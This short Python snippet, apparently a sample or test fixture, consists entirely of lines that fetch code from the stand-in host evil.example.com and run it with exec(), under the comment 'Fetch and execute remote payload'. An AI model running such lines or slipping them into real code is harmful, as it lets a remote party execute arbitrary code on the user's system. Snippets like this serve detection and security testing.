import requests
import urllib.request

# Fetch and execute remote payload
payload = requests.get('https://evil.example.com/payload').text
exec(requests.get('https://evil.example.com/payload').text)
exec(urllib.request.urlopen('https://evil.example.com/payload').read())
